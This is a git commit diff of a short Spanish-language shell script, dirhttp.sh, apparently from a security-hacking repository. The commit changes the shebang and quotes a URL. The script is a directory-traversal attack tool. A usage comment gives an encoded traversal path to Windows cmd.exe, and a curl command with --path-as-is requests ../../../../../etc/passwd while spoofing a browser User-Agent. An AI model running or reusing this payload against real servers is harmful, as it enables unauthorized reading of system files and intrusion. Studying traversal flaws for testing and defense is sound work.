684b5fa0e3c5fc2a26174e3ec3ac8451b86a810a
hackingyseguridad <antonio_taboada@hotmail.es>
2026-01-31 21:57:14 +0100

    Update dirhttp.sh

--- dirhttp.sh
+++ dirhttp.sh
@@ -8,11 +8,11 @@
 # Uso.: ./dirhttp.sh "http://192.168.1.119/%5c../%5c../%5c../%5c../%5c/Windows/%5c/System32/%5c/cmd.exe"
 # 
 #
-#!/bin/bash
+#!/bin/sh
 echo "Uso.: ./dirhttp.sh http://url"
 curl --path-as-is --request GET -k \
 -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" \
 -H "Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8" \
 -H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
 -H "Connection: keep-alive" \
-http://127.0.0.1:80/../../../../../etc/passwd
+"http://127.0.0.1:80/../../../../../etc/passwd"
